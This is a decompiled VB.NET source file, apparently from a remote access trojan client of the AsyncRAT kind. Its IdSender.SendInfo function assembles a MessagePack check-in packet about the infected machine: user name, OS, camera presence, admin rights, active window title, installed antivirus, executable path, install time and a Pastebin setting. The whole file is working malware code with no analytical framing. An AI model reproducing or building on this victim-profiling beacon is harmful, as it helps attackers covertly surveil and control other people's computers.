Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.Devices

Namespace Client.Helper
	' Token: 0x02000012 RID: 18
	Public Module IdSender
		' Token: 0x06000054 RID: 84 RVA: 0x00003E38 File Offset: 0x00002038
		Public Function SendInfo() As Byte()
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Pac_ket").AsString = "ClientInfo"
			msgPack.ForcePathObject("HWID").AsString = Settings.Hw_id
			msgPack.ForcePathObject("User").AsString = Environment.UserName.ToString()
			msgPack.ForcePathObject("OS").AsString = New ComputerInfo().OSFullName.ToString().Replace("Microsoft", Nothing) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit")
			msgPack.ForcePathObject("Camera").AsString = Camera.havecamera().ToString()
			msgPack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName
			msgPack.ForcePathObject("Version").AsString = Settings.Ver_sion
			msgPack.ForcePathObject("Admin").AsString = Methods.IsAdmin().ToString().ToLower().Replace("true", "Admin").Replace("false", "User")
			msgPack.ForcePathObject("Perfor_mance").AsString = Methods.GetActiveWindowTitle()
			msgPack.ForcePathObject("Paste_bin").AsString = Settings.Paste_bin
			msgPack.ForcePathObject("Anti_virus").AsString = Methods.Antivirus()
			msgPack.ForcePathObject("Install_ed").AsString = New FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString()
			msgPack.ForcePathObject("Po_ng").AsString = ""
			msgPack.ForcePathObject("Group").AsString = Settings.Group
			Return msgPack.Encode2Bytes()
		End Function
	End Module
End Namespace
